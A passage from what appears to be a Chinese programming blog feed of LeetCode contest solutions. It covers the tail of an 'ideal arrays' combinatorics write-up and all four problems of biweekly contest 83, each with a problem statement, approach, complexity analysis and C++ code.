<li><p>解法1：<a href="https://leetcode.cn/problems/count-the-number-of-ideal-arrays/solution/zu-he-shu-by-newhar-4kva/">参考解法：排列组合</a>。<br>由于题目中满足 $arr[i]$ 能够被 $arr[i-1]$ 整除，假设序列为 $[a_0,a_1,a_2, …, a_{n-1}]$，假设相邻的两个元素进行相除可以得到如下序列 $d &#x3D; [a_0, \frac{a_2}{a_1},\frac{a_3}{a_2}, \cdots \frac{a_i}{a_{i-1}}, \cdots \frac{a_{n-1}}{a_{n-2}}]$，其中令 $d_{i} &#x3D; \frac{a_i}{a_{i-1}}$，我们可以知道如下递推关系 $a_{i} &#x3D; \prod \limits_{j&#x3D;0}^{i} d_j$，因此我们只需要求出数组 $d$ 就可以求出数组 $arr$，如果我们求出数组 $d$ 的数目。我们设 $f[i]$ 表示数组中的最后一个元素 $arr[n-1]$ 的数组的数组，此时我们知道总共的不同的数组的数组为 $tot &#x3D; \sum \limits_{i&#x3D;1}^{maxValue} f[i]$。对于数组中最最后一个元素为 $i$，设 $i$ 的质因子为 $p_0,p_1, …, p_{m-1}$ 则我们知道 $i &#x3D; p_0^{c_0}p_1^{c_1}p_{m-1}^{c_{m-1}}$，跟局之前的推论我们可以知道 $i &#x3D; p_0^{c_0}p_1^{c_1}p_{m-1}^{c_{m-1}} &#x3D; \prod \limits_{j&#x3D;0}^{n-1} d_j$，此时我们只需要将 $C &#x3D; \sum \limits_{j &#x3D; 0}^{m-1}c_j$ 这几个因子放入到 $n$ 个位置中，其中每个位置可以重复放多个元素，剩余未放置元素的位置填入 $1$ 即可。这就等价于将 $m$ 种不同颜色的球放入到 $n$ 个不同的盒子中的不同放置方法的数量，这个不太好求，应该有类似的公式可以直接求解，但是还不太清楚这个排列组合的公式怎么求。但是我们知道一个经典问题，将 $k$ 个相同的球放入到 $n$ 个不同的盒子中放置方法为 $C_{n+k-1}^{n-1}$，关于组合数学问题的解释可以参考 「<a href="https://zhuanlan.zhihu.com/p/106135565">3分钟帮你完全理解排列组合中的隔板问题</a>」，这个解释得非常清晰易懂。因此我们就知道了对于 $f[i] &#x3D; \prod \limits_{j&#x3D;0}^{m}C_{n + c_j-1}^{n-1}$，这样我们就很容易的求出答案了。关于乘法逆元的证明：<a href="https://blog.csdn.net/Time_Limit/article/details/117390957">四种方法求乘法逆元！四种！</a></p>
</li>
<li><p>中间涉及的细节问题：求组合的经典数学公式与乘法逆元的计算公式如下:<br>$$<br>C_{i}^{j} &#x3D; C_{i-1}^{j} + C_{i-1}^{j-1} \<br>C_{i}^{j} &#x3D; \frac{A_{i}^{j}}{j!} &#x3D; \frac{A!}{(i-j)! \times j!} \<br>C_{i}^{j} \mod P &#x3D; \frac{A!}{(i-j)! \times j!} \mod P<br>&#x3D; A! \times ((i-j)!)^{-1} \times (j!)^{-1} \mod P \<br>x \times x^{-1} \mod P \equiv 1 \mod P \<br>x \times x^{P-2} \mod P \equiv 1 \mod P \<br>x^{-1} &#x3D; x^{P-2} \mod P<br>$$<br>关于阶乘的逆元的计算:<br>$$<br>x^{-1} \times y^{-1} &#x3D; (x \times y)^{-1}\<br>(n!)^{-1} \times (n + 1) \times (n + 1)^{-1} \equiv (n!)^{-1} \mod P \<br>((n+1)!)^{-1} \times (n + 1)\equiv (n!)^{-1} \mod P \<br>n + 1 \equiv (n+1)! \times (n!)^{-1} \mod P \<br>(n + 1)^{-1} \equiv ((n+1)!)^{-1} \times n! \mod P<br>$$</p>
</li>
<li><p>复杂度分析：</p>
<ul>
<li>时间复杂度：$m \log \log m$，$m$ 表示 $maxvalue$。</li>
<li>空间复杂度：$m \times \log m$，$m$ 表示 $maxvalue$。</li>
</ul>
</li>
<li><p>解法2：<a href="https://leetcode.cn/problems/count-the-number-of-ideal-arrays/solution/shu-ju-fan-wei-ge-ju-xiao-liao-by-johnkr-dl63/">参考解法：线性筛选法</a>。感觉这个解法理解起来太难了。用到了非常多的数学理论知识。</p>
</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>解法一:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MAX_FACTOR_NUM = <span class="number">20</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">long</span> <span class="type">long</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">idealArrays</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> maxValue)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxn = n + MAX_FACTOR_NUM;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">primer</span>(maxValue + <span class="number">1</span>);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">comb</span>(maxn + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(MAX_FACTOR_NUM + <span class="number">1</span>, <span class="number">1L</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= maxValue; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">2</span>; p * p &lt;= x; p++) &#123;</span><br><span class="line">                <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (x % p == <span class="number">0</span>) &#123;</span><br><span class="line">                    c++;</span><br><span class="line">                    x /= p;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (c &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    primer[i].<span class="built_in">emplace_back</span>(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* x 本身为质数 */</span></span><br><span class="line">            <span class="keyword">if</span> (x &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                primer[i].<span class="built_in">emplace_back</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= maxn; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; i &amp;&amp; j &lt;= MAX_FACTOR_NUM; j++) &#123;</span><br><span class="line">                comb[i][j] = (comb[i<span class="number">-1</span>][j] + comb[i<span class="number">-1</span>][j<span class="number">-1</span>]) % MOD;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= maxValue; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> curr = <span class="number">1L</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> c : primer[i]) &#123;</span><br><span class="line">                curr = (curr * comb[n + c - <span class="number">1</span>][c]) % MOD;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = (ans + curr) % MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans % MOD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly conttest 83</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/19/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-conttest-83"><a href="#leetcode-biweekly-conttest-83" class="headerlink" title="leetcode biweekly conttest 83"></a>leetcode biweekly conttest 83</h2><p>比较简单的周赛，4个题目感觉都挺无聊的。</p>
<h3 id="6128-最好的扑克手牌"><a href="#6128-最好的扑克手牌" class="headerlink" title="6128. 最好的扑克手牌"></a>6128. 最好的扑克手牌</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>ranks</code> 和一个字符数组 <code>suit</code> 。你有 <code>5</code> 张扑克牌，第 <code>i</code> 张牌大小为 <code>ranks[i]</code> ，花色为 <code>suits[i]</code> 。</p>
<p>下述是从好到坏你可能持有的 手牌类型 ：</p>
<ul>
<li><code>&quot;Flush&quot;</code>：同花，五张相同花色的扑克牌。</li>
<li><code>&quot;Three of a Kind&quot;</code>：三条，有 <code>3</code> 张大小相同的扑克牌。</li>
<li><code>&quot;Pair&quot;</code>：对子，两张大小一样的扑克牌。</li>
<li><code>&quot;High Card&quot;</code>：高牌，五张大小互不相同的扑克牌。<br>请你返回一个字符串，表示给定的 <code>5</code> 张牌中，你能组成的 最好手牌类型 。</li>
</ul>
<p>注意：返回的字符串 大小写 需与题目描述相同。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：ranks = [13,2,3,1,9], suits = [&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;]</span><br><span class="line">输出：&quot;Flush&quot;</span><br><span class="line">解释：5 张扑克牌的花色相同，所以返回 &quot;Flush&quot; 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：ranks = [4,4,2,4,4], suits = [&quot;d&quot;,&quot;a&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</span><br><span class="line">输出：&quot;Three of a Kind&quot;</span><br><span class="line">解释：第一、二和四张牌组成三张相同大小的扑克牌，所以得到 &quot;Three of a Kind&quot; 。</span><br><span class="line">注意我们也可以得到 &quot;Pair&quot; ，但是 &quot;Three of a Kind&quot; 是更好的手牌类型。</span><br><span class="line">有其他的 3 张牌也可以组成 &quot;Three of a Kind&quot; 手牌类型。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：ranks = [10,10,2,12,9], suits = [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;a&quot;,&quot;d&quot;]</span><br><span class="line">输出：&quot;Pair&quot;</span><br><span class="line">解释：第一和第二张牌大小相同，所以得到 &quot;Pair&quot; 。</span><br><span class="line">我们无法得到 &quot;Flush&quot; 或者 &quot;Three of a Kind&quot; 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>ranks.length == suits.length == 5</code></li>
<li><code>1 &lt;= ranks[i] &lt;= 13</code></li>
<li><code>&#39;a&#39; &lt;= suits[i] &lt;= &#39;d&#39;</code></li>
<li>任意两张扑克牌不会同时有相同的大小和花色。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-83/problems/best-poker-hand/">https://leetcode.cn/contest/biweekly-contest-83/problems/best-poker-hand/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单题目，直接尝试所有的可能即可</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">bestHand</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; ranks, vector&lt;<span class="type">char</span>&gt;&amp; suits)</span> </span>&#123;</span><br><span class="line">        <span class="type">bool</span> isFlush = <span class="literal">true</span>; </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; suits.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (suits[i] != suits[i<span class="number">-1</span>]) &#123;</span><br><span class="line">                isFlush = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isFlush) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Flush&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">sort</span>(ranks.<span class="built_in">begin</span>(), ranks.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; ranks.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ranks[i] == ranks[i<span class="number">-1</span>] &amp;&amp; ranks[i] == ranks[i<span class="number">-2</span>]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Three of a Kind&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; ranks.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ranks[i] == ranks[i<span class="number">-1</span>]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Pair&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;High Card&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6129-全-0-子数组的数目"><a href="#6129-全-0-子数组的数目" class="headerlink" title="6129. 全 0 子数组的数目"></a>6129. 全 0 子数组的数目</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> ，返回全部为 <code>0</code> 的 子数组 数目。</p>
<p>子数组 是一个数组中一段连续非空元素组成的序列。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,0,0,2,0,0,4]</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">子数组 [0] 出现了 4 次。</span><br><span class="line">子数组 [0,0] 出现了 2 次。</span><br><span class="line">不存在长度大于 2 的全 0 子数组，所以我们返回 6 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0,0,0,2,0,0]</span><br><span class="line">输出：9</span><br><span class="line">解释：</span><br><span class="line">子数组 [0] 出现了 5 次。</span><br><span class="line">子数组 [0,0] 出现了 3 次。</span><br><span class="line">子数组 [0,0,0] 出现了 1 次。</span><br><span class="line">不存在长度大于 3 的全 0 子数组，所以我们返回 9 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,10,2019]</span><br><span class="line">输出：0</span><br><span class="line">解释：没有全 0 子数组，所以我们返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>-109 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-83/problems/number-of-zero-filled-subarrays/">https://leetcode.cn/contest/biweekly-contest-83/problems/number-of-zero-filled-subarrays/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>设 <code>x</code> 为当前连续的 <code>0</code> 的长度，则此时可以产生 $\frac{n *(n - 1)}{2}$ 个全 <code>0</code> 的子数组。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">zeroFilledSubarray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                cnt = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ans += cnt;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6130-设计数字容器系统"><a href="#6130-设计数字容器系统" class="headerlink" title="6130. 设计数字容器系统"></a>6130. 设计数字容器系统</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>设计一个数字容器系统，可以实现以下功能：</p>
<p>在系统中给定下标处 插入 或者 替换 一个数字。<br>返回 系统中给定数字的最小下标。<br>请你实现一个 <code>NumberContainers</code> 类：</p>
<ul>
<li><code>NumberContainers()</code> 初始化数字容器系统。</li>
<li><code>void change(int index, int number)</code> 在下标 <code>index</code> 处填入 <code>number</code> 。如果该下标 <code>index</code> 处已经有数字了，那么用 <code>number</code> 替换该数字。</li>
<li><code>int find(int number)</code> 返回给定数字 <code>number</code> 在系统中的最小下标。如果系统中没有 <code>number</code> ，那么返回 <code>-1</code> 。</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;NumberContainers&quot;, &quot;find&quot;, &quot;change&quot;, &quot;change&quot;, &quot;change&quot;, &quot;change&quot;, &quot;find&quot;, &quot;change&quot;, &quot;find&quot;]</span><br><span class="line">[[], [10], [2, 10], [1, 10], [3, 10], [5, 10], [10], [1, 20], [10]]</span><br><span class="line">输出：</span><br><span class="line">[null, -1, null, null, null, null, 1, null, 2]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">NumberContainers nc = new NumberContainers();</span><br><span class="line">nc.find(10); // 没有数字 10 ，所以返回 -1 。</span><br><span class="line">nc.change(2, 10); // 容器中下标为 2 处填入数字 10 。</span><br><span class="line">nc.change(1, 10); // 容器中下标为 1 处填入数字 10 。</span><br><span class="line">nc.change(3, 10); // 容器中下标为 3 处填入数字 10 。</span><br><span class="line">nc.change(5, 10); // 容器中下标为 5 处填入数字 10 。</span><br><span class="line">nc.find(10); // 数字 10 所在的下标为 1 ，2 ，3 和 5 。因为最小下标为 1 ，所以返回 1 。</span><br><span class="line">nc.change(1, 20); // 容器中下标为 1 处填入数字 20 。注意，下标 1 处之前为 10 ，现在被替换为 20 。</span><br><span class="line">nc.find(10); // 数字 10 所在下标为 2 ，3 和 5 。最小下标为 2 ，所以返回 2 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= index, number &lt;= 109</code></li>
<li>调用 <code>change</code> 和 <code>find</code> 的 总次数 不超过 <code>105</code> 次。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-83/problems/design-a-number-container-system/">https://leetcode.cn/contest/biweekly-contest-83/problems/design-a-number-container-system/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>hash + treeset
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉可以算是一个简单题目，用两个<code>hash</code> 表实现即可。一个 <code>hash</code> 用来存储索引到值的映射，另一个用来存储值到索引的映射，每次 <code>change</code> 操作时，两个 <code>hash</code> 同时替换即可。确实没有多少可讲的。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：暴力模拟的时间复杂度为 $O(n \log n)$。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumberContainers</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">NumberContainers</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">change</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">count</span>(index)) &#123;</span><br><span class="line">            <span class="type">int</span> val = nums[index];</span><br><span class="line">            cnt[val].<span class="built_in">erase</span>(index);</span><br><span class="line">            <span class="keyword">if</span> (cnt[val].<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">                cnt.<span class="built_in">erase</span>(val);</span><br><span class="line">            &#125;</span><br><span class="line">            nums.<span class="built_in">erase</span>(index);</span><br><span class="line">        &#125; </span><br><span class="line">        nums[index] = number;</span><br><span class="line">        cnt[number].<span class="built_in">emplace</span>(index);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!cnt.<span class="built_in">count</span>(number)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *(cnt[number].<span class="built_in">begin</span>());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; nums;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, set&lt;<span class="type">int</span>&gt;&gt; cnt;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your NumberContainers object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * NumberContainers* obj = new NumberContainers();</span></span><br><span class="line"><span class="comment"> * obj-&gt;change(index,number);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;find(number);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="6131-不可能得到的最短骰子序列"><a href="#6131-不可能得到的最短骰子序列" class="headerlink" title="6131. 不可能得到的最短骰子序列"></a>6131. 不可能得到的最短骰子序列</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个长度为 <code>n</code> 的整数数组 <code>rolls</code> 和一个整数 <code>k </code>。你扔一个 <code>k</code> 面的骰子 <code>n</code> 次，骰子的每个面分别是 <code>1</code> 到 <code>k</code> ，其中第 <code>i</code> 次扔得到的数字是 <code>rolls[i]</code> 。</p>
<p>请你返回 无法 从 <code>rolls</code> 中得到的 最短 骰子子序列的长度。</p>
<p>扔一个 k 面的骰子 <code>len</code> 次得到的是一个长度为 <code>len</code> 的 骰子子序列 。</p>
<p>注意 ，子序列只需要保持在原数组中的顺序，不需要连续。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：rolls = [4,2,1,2,3,3,2,4,1], k = 4</span><br><span class="line">输出：3</span><br><span class="line">解释：所有长度为 1 的骰子子序列 [1] ，[2] ，[3] ，[4] 都可以从原数组中得到。</span><br><span class="line">所有长度为 2 的骰子子序列 [1, 1] ，[1, 2] ，... ，[4, 4] 都可以从原数组中得到。</span><br><span class="line">子序列 [1, 4, 2] 无法从原数组中得到，所以我们返回 3 。</span><br><span class="line">还有别的子序列也无法从原数组中得到。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：rolls = [1,1,2,2], k = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：所有长度为 1 的子序列 [1] ，[2] 都可以从原数组中得到。</span><br><span class="line">子序列 [2, 1] 无法从原数组中得到，所以我们返回 2 。</span><br><span class="line">还有别的子序列也无法从原数组中得到，但 [2, 1] 是最短的子序列。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：rolls = [1,1,3,2,2,2,3,3], k = 4</span><br><span class="line">输出：1</span><br><span class="line">解释：子序列 [4] 无法从原数组中得到，所以我们返回 1 。</span><br><span class="line">还有别的子序列也无法从原数组中得到，但 [4] 是最短的子序列。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == rolls.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= rolls[i] &lt;= k &lt;= 105</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-83/problems/shortest-impossible-sequence-of-rolls/">https://leetcode.cn/contest/biweekly-contest-83/problems/shortest-impossible-sequence-of-rolls/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉是比较简单的排列组合理论即可，我们仔细观察一下：</li>
</ol>
<ul>
<li>如果满足长度为 $1$ 的子序列全部出现，则此时数组中一定满足出现 $s &#x3D; [1,\cdots, k]$，当然可以是 $s$ 的任意顺序；</li>
<li>如果满足长度为 $2$ 的子序列全部出现，则此时数组中一定满足对于任意的 $i \in [1,k]$ 的索引后面一定会出现 $s &#x3D; [1,\cdots, k]$ 的任意排列，综上可以知道此时数组中一定出现两个 $s$ 序列 $s_1 &#x3D; [1,\cdots, k], s_0 &#x3D; [1,s\cdots, k]$ 且 $s_1$ 中的全部元素一定在 $ s_0$ 的前面。只有这样才能保证所有长度为$2$ 的子序列全部出现。</li>
<li>综上我们可以观察出，我们只需要计算数组中连续出现序列 $s &#x3D; [1, \cdots, k] $ 的最大次数即可。</li>
<li>连续出现的最大次数加 $1$ 即为无法得到的最短序列。我们可以用 <code>hash</code> 表来统计当前序列中已经出现的不同元素是否达到 $k$ 个。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，$n$ 表示数组 $rolls$ 的长度。</li>
<li>空间复杂度：$O(k)$，哈希表中最多存储 $k$ 个元素。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestSequence</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; rolls, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = rolls.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(rolls[i]);</span><br><span class="line">            <span class="keyword">if</span> (cnt.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">                ans++;</span><br><span class="line">                cnt.<span class="built_in">clear</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
